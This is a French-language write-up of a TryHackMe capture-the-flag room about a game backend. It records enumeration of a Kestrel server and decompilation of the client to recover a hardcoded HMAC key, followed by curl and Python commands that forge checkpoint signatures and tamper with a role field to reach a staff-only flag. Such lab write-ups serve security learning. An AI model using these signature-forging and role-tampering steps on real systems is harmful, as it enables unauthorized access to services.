@@ -1,0 +1,334 @@
+Try hack me  : grandlarcenyautoii
+
+adresse  : http://gla2.thm/
+
+niveau : intermédiare
+
+
+Instruction : GLA II shipped on time, unlike some sequels. Somewhere in Los Vantos is a vault the developers swear you'll never open, so this time the flag isn't in the game at all. The safehouse vault is back, but robbing it isn't a single-player job anymore. Pull the game apart, work out how it talks to the city's back office, and take what the developers insist is locked. The cheat console lies. The vault on your screen lies. The real score is something you have to earn, then prove you earned it.
+
+1 - Reconnaissance
+
+On a le port 22 et le port 80 ouverts, on a également un fichier en 7z, peut-être le code source du jeu, mais on va d'abord explorer le http pour notre reconnaissance,
+malgré le fait que le site semble nous renvoyer 404 partout
+
+Server: Kestrel
+
+On a trouvé cela avec dirsearch : http://gla2.thm/health qui semble renvoyer du json ok : true
+
+il y a également
+[00:42:02] 405 -    0B  - /session/
+[00:42:02] 405 -    0B  - /session
+
+Avec wappalyzer, on a su que le serveur est fait en microsoft ASP.NET, il n'affiche pas la version
+
+On a également trouvé une information utile au sujet de Kestrel
+
+• CVE-2025-55315 (CVSS 9.9 - Critical)
+	• What it is: An HTTP request/response smuggling vulnerability caused by boundary parsing differences (via modified Content-Length and Transfer-Encoding or LF-only chunked line endings) between front-end proxies and Kestrel.
+	• Impact: Security feature bypass, authentication bypass, Server-Side Request Forgery (SSRF), and potential remote code execution.
+	• Affected Software: ASP.NET Core 10.0 (<=10.0.0-rc.1), ASP.NET Core 9.0 (9.0.0–9.0.9), ASP.NET Core 8.0 (8.0.0–8.0.20), and Kestrel Core <=2.3.0. (.NET 6 is also affected but EOL).
+	• Patched Versions: ASP.NET Core 10.0.0-rc.2, 9.0.10, 8.0.21, and Kestrel Core 2.3.6.
+
+	ça pourrait être utile plus tard
+
+	On sort curl maintenant, vu que le browser ne semble rien faire
+
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─✘ $ curl -i -X OPTIONS http://gla2.thm/session
+HTTP/1.1 405 Method Not Allowed
+Content-Length: 0
+Date: Sat, 17 Oct 2026 22:03:06 GMT
+Server: Kestrel
+Allow: POST
+
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$
+
+ Fantastique ! On a un methode POST autorisé
+
+ on a essayé POST justement, et on a
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$ curl -i -X POST http://gla2.thm/session
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Sat, 17 Oct 2026 22:04:09 GMT
+Server: Kestrel
+Transfer-Encoding: chunked
+
+{"session_id":"BrB2k-3bUymdJd0GzVNF8i3b","stash_order":[2,0,1],"token":"IahxmGhOGoNGlyhCETomntZ5"}
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$
+
+on a également trouvé ┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$ cat data_GrandLarcenyAuto_linuxbsd_x86_64/GrandLarcenyAuto.runtimeconfig.json
+{
+  "runtimeOptions": {
+    "tfm": "net8.0",
+    "includedFrameworks": [
+      {
+        "name": "Microsoft.NETCore.App",
+        "version": "8.0.29"
+      }
+    ],
+    "configProperties": {
+      "System.Reflection.Metadata.MetadataUpdater.IsSupported": false,
+      "System.Runtime.Serialization.EnableUnsafeBinaryFormatterSerialization": false
+    }
+  }
+}       (c'est une version vulnérable, mais explorons encore )
+
+Là, on vient de trouver quelque chose de beaucoup plus intéressant qu'une simple version vulnérable de Kestrel.
+
+private static readonly byte[] SignKey = Encoding.UTF8.GetBytes("gla2_crew_sign_v1_2f9b6c8ad14e"); sur popclient avec ilspy
+
+Le client contient une clé HMAC codée en dur, une fonction de signature, deux endpoints supplémentaires et un mécanisme de calcul de rôle à partir de l'ordre des braquages. Ce sont des pistes concrètes pour comprendre comment le backend valide les actions du joueur.
+On va analyser ça comme en reverse engineering : comprendre le protocole, formuler des hypothèses, puis les tester sur la machine TryHackMe.
+
+Grâce à PoPClient, nous connaissons désormais trois endpoints :
+Endpoint	Méthode	Fonction supposée
+/session	POST	Créer une session et obtenir les paramètres nécessaires.
+/checkpoint	POST	Signaler une étape du braquage.
+/claim	POST	Réclamer le résultat final.
+
+2 - exploitation
+Les deux derniers endpoints sont confirmés par le code du client, mais leur comportement côté serveur reste à vérifier.
+Le flux prévu par le client semble être :
+1. Création d'une session.
+2. Réalisation de plusieurs étapes.
+3. Envoi de checkpoints au serveur.
+4. Réclamation du résultat.
+La variable Next commence par heat5, ce qui nous donne un premier indice sur le nom de l'étape initiale.
+
+on va maintenant le tester avec
+curl -i -X POST http://gla2.thm/checkpoint \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "session_id": "BrB2k-3bUymdJd0GzVNF8i3b",
+    "step": "heat5",
+    "token": "IahxmGhOGoNGlyhCETomntZ5",
+    "sig": "gla2_crew_sign_v1_2f9b6c8ad14e"
+  }'
+
+  On a exploré les codes sources du jeu et on a trouvé
+
+public class SafehouseVault
+{
+	private readonly PlayerState player;
+
+	public SafehouseVault(PlayerState player)
+	{
+		this.player = player;
+	}
+
+	public string TryOpen()
+	{
+		_ = player.WantedStars;
+		return "VAULT UNSEALED\nTHM{th3_v4ult_......_4_d3c0y}";
+	}
+} mais c'était qu'une leure, cela nous montre qu'on approche
+
+c'est la première fois que j'utilise ilspy, c'est la raison pour laquelle j'ai des difficultés encore à utiliser l'outils, mais j'ai déjà fait des reverse engineering en C# donc cela nous aidera.
+
+On va donc regenerer notre session ┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─✘ $ curl -s -X POST http://gla2.thm/session \
+  -H 'Content-Type: application/json' \
+  -d '{}'
+{"session_id":"Vz2FOsNjSw3-OGeM9vngulS-","stash_order":[1,0,2],"token":"kYPt7hM8csaOy_AxHIEX8dP2"}
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$   et on a obtenu notre stash order (c'est important pour la suite)
+Pour calculer la signature d'un checkpoint, la formule exacte trouvée dans ton code est :
+HMAC-SHA256(
+    clé = SignKey,
+    message = session_id + "|" + step + "|" + token
+)
+
+La signature attendue est le digest hexadécimal en minuscules. La clé elle-même n'est pas la signature : c'était le problème dans ta requête précédente.
+
+curl -i -X POST http://gla2.thm/checkpoint \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "session_id": "Vz2FOsNjSw3-OGeM9vngulS-",
+    "step": "heat5",
+    "token": "kYPt7hM8csaOy_AxHIEX8dP2",
+    "sig": "63b1adaa05511f95386dd3a743dc86c59df6a86349a35ba3617eaf9af983e993"
+  }'
+  on envoue ensuite le signature pour ne pas qu'il expire  ┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$ curl -i -X POST http://gla2.thm/checkpoint \                                                                                    3s
+  -H 'Content-Type: application/json' \
+  -d '{
+    "session_id": "Vz2FOsNjSw3-OGeM9vngulS-",
+    "step": "heat5",
+    "token": "kYPt7hM8csaOy_AxHIEX8dP2",
+    "sig": "63b1adaa05511f95386dd3a743dc86c59df6a86349a35ba3617eaf9af983e993"
+  }'
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Sat, 17 Oct 2026 23:06:50 GMT
+Server: Kestrel
+Transfer-Encoding: chunked
+
+{"ok":true,"step":"heat5","next":"stash1","token":"XtLJYT_YJneRxGQvHROc5Hvs"}
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$
+
+Le serveur a accepté stash1 et confirme maintenant stash0 comme prochaine étape.
+La progression observée est :
+heat5  ✓
+   ↓
+stash1 ✓
+   ↓
+stash0 ← prochaine étape
+
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$ SESSION='Vz2FOsNjSw3-OGeM9vngulS-'
+TOKEN='XtLJYT_YJneRxGQvHROc5Hvs'
+STEP='stash1'
+
+SIG=$(python3 -c '
+import hashlib, hmac, sys
+key = b"gla2_crew_sign_v1_2f9b6c8ad14e"
+session, step, token = sys.argv[1:]
+msg = f"{session}|{step}|{token}".encode()
+print(hmac.new(key, msg, hashlib.sha256).hexdigest())
+' "$SESSION" "$STEP" "$TOKEN")
+
+curl -s -X POST http://gla2.thm/checkpoint \
+  -H 'Content-Type: application/json' \
+  -d "{\"session_id\":\"$SESSION\",\"step\":\"$STEP\",\"token\":\"$TOKEN\",\"sig\":\"$SIG\"}"
+{"ok":true,"step":"stash1","next":"stash0","token":"K1yGjmOO4F8TPl8TdYHGnOmB"}
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$
+
+On vient de confirmer que le serveur impose bien l'ordre des étapes et renouvelle le token après chaque checkpoint accepté.
+
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$ SIG=$(python3 -c '
+import hashlib, hmac, sys
+key = b"gla2_crew_sign_v1_2f9b6c8ad14e"
+session, step, token = sys.argv[1:]
+msg = f"{session}|{step}|{token}".encode()
+print(hmac.new(key, msg, hashlib.sha256).hexdigest())
+' "$SESSION" "$STEP" "$TOKEN")
+
+curl -s -X POST http://gla2.thm/checkpoint \
+  -H 'Content-Type: application/json' \
+  -d "{\"session_id\":\"$SESSION\",\"step\":\"$STEP\",\"token\":\"$TOKEN\",\"sig\":\"$SIG\"}"
+{"ok":true,"step":"stash0","next":"stash2","token":"XNqAtiBZ0Ggf7UaC-HISCVGh"}
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$ TOKEN='XNqAtiBZ0Ggf7UaC-HISCVGh'
+STEP='stash2'
+
+SIG=$(python3 -c '
+import hashlib, hmac, sys
+key = b"gla2_crew_sign_v1_2f9b6c8ad14e"
+session, step, token = sys.argv[1:]
+msg = f"{session}|{step}|{token}".encode()
+print(hmac.new(key, msg, hashlib.sha256).hexdigest())
+' "$SESSION" "$STEP" "$TOKEN")
+
+curl -s -X POST http://gla2.thm/checkpoint \
+  -H 'Content-Type: application/json' \
+  -d "{\"session_id\":\"$SESSION\",\"step\":\"$STEP\",\"token\":\"$TOKEN\",\"sig\":\"$SIG\"}"
+{"ok":true,"step":"stash2","next":"vault","token":"K-IXSuNPB9GlALjkX_tPGeGg"}
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$ TOKEN='K-IXSuNPB9GlALjkX_tPGeGg'
+STEP='vault'
+
+SIG=$(python3 -c '
+import hashlib, hmac, sys
+key = b"gla2_crew_sign_v1_2f9b6c8ad14e"
+session, step, token = sys.argv[1:]
+msg = f"{session}|{step}|{token}".encode()
+print(hmac.new(key, msg, hashlib.sha256).hexdigest())
+' "$SESSION" "$STEP" "$TOKEN")
+
+curl -s -X POST http://gla2.thm/checkpoint \
+  -H 'Content-Type: application/json' \
+  -d "{\"session_id\":\"$SESSION\",\"step\":\"$STEP\",\"token\":\"$TOKEN\",\"sig\":\"$SIG\"}"
+{"ok":true,"step":"vault","next":null,"token":"7cMJRgrzD8fwyKWj8DYcXKSG"}
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$
+
+Maintenant, on arrive vers la logique de claim  si on suit bien les étapes
+
+notre dernier token est 7cMJRgrzD8fwyKWj8DYcXKSG
+
+pour obtenir le digest, j'ai fait
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$ python3 - <<'PY'
+import hashlib
+
+sequence = "heat5_stash1_stash0_stash2_vault"
+print(hashlib.sha1(sequence.encode()).hexdigest())
+PY
+3815408632fbb83b1e6ab52cf4b4dc4c499440a2
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$
+on va maintenant l'envoyer vers claim ┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$ echo "$SESSION"
+echo "$TOKEN"
+Vz2FOsNjSw3-OGeM9vngulS-
+7cMJRgrzD8fwyKWj8DYcXKSG
+
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$ SIG=$(python3 -c '
+import hashlib, hmac, sys
+key = b"gla2_crew_sign_v1_2f9b6c8ad14e"
+session, token = sys.argv[1:]
+msg = f"{session}|claim|{token}".encode()
+print(hmac.new(key, msg, hashlib.sha256).hexdigest())
+' "$SESSION" "$TOKEN")
+
+curl -i -X POST http://gla2.thm/claim \
+  -H 'Content-Type: application/json' \
+  -d "{\"session_id\":\"$SESSION\",\"role\":\"player\",\"token\":\"$TOKEN\",\"sig\":\"$SIG\"}"
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Sat, 17 Oct 2026 23:17:01 GMT
+Server: Kestrel
+Transfer-Encoding: chunked
+
+{"flag":"THM{n1c3....._wr0ng_v4ult}","tier":"player","note":"civilian access — the real vault is staff-only"}
+┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/grandlarcenyautoii/GrandLarcenyAuto]
+└─$
+
+ bingo :) notre indice est précis
+
+ j'ai passé plusieurs heures après, mais j'ai vu que DeriveStaffRole n'a jamais été appelé, et je me suis demandé : et si je change le role ? c'est ce que j'ai fait avec
+ ROLE="3815408632fbb83b1e6ab52cf4b4dc4c499440a2"
+
+curl -i -X POST http://gla2.thm/claim \
+  -H 'Content-Type: application/json' \
+  -d "{\"session_id\":\"$SESSION\",\"role\":\"$ROLE\",\"token\":\"$TOKEN\",\"sig\":\"$SIG\"}"
+
+  et on a
+
+  HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Sat, 17 Oct 2026 23:35:37 GMT
+Server: Kestrel
+Transfer-Encoding: chunked
+
+{"flag":"THM{redacted}"}
+
+BINGO !
+
+ce que j'ai appris :
+
+le reserve engineering avec godot dans un environnement réel
+les gestions de signatures
+comprendre le flow pour savoir où se situe la vulnérabilité
+
+
+
+
